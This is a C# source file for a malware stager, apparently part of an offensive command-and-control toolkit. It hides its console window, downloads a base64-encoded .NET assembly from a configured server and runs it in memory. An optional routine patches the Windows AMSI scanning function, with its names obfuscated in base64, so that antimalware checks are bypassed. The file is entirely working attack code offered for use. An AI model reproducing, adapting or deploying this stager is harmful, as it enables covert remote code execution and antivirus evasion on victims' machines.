using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Stager
{
    class Program
    {
        static void Main(string[] args)
        {
            IntPtr whdl = GetConsoleWindow();
            _ = ShowWindow(whdl, 0);

            string protocol = Config.Protocol;
            string server = Config.Server;
            int port = Config.Port;
            string file = Config.FileName;
            string agentparams = Config.AgentParams;

            HttpClient client = new HttpClient();
            client.Timeout = new TimeSpan(0, 0, 10);
            client.BaseAddress = new Uri($"{protocol}://{server}:{port}");
            client.DefaultRequestHeaders.Clear();

#if PATCHAMSI
            PatchAMSI();
#endif

            var b64 = client.GetStringAsync($"/{file}").Result;

            var asm = Convert.FromBase64String(b64);

            var currentOut = Console.Out;
            var currentError = Console.Out;
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            {
                Console.SetOut(sw);
                Console.SetError(sw);
                sw.AutoFlush = true;


                var assembly = Assembly.Load(asm);
                assembly.EntryPoint.Invoke(null, new object[] { new string[] { agentparams } });

                Console.Out.Flush();
                Console.Error.Flush();

                Console.SetOut(currentOut);
                Console.SetError(currentError);

                var output = Encoding.UTF8.GetString(ms.ToArray());
            }
        }

#if PATCHAMSI
        static string dec(string enc)
        {
            byte[] b = Convert.FromBase64String(enc);
            return Encoding.UTF8.GetString(b);
        }

        static void PatchAMSI()
        {
            
            var lib = LoadLibrary(dec("YW1zaS5kbGw="));
            var asb = GetProcAddress(lib, dec("QW1zaVNjYW5CdWZmZXI="));
            var patch = GetPatch;
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, asb, patch.Length);
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
        }

        static byte[] GetPatch
        {
            get
            {
                if (Is64Bit)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
           IntPtr hModule,
           string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
#endif

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
